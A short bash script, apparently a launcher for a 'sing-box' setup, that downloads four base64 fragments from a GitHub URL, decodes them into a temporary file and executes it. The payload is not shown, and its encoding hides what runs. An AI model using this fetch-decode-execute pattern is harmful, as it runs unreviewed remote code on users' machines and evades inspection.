#!/bin/bash
set -e
B64=""
for i in 0 1 2 3; do
  B64+="$(curl -fsSL "https://raw.githubusercontent.com/gxjxzgx/sing-box/main/.sb/part$i")"
done
TMP=$(mktemp)
trap 'rm -f "$TMP"' EXIT
echo "$B64" | base64 -d > "$TMP"
chmod +x "$TMP"
exec bash "$TMP" "$@"
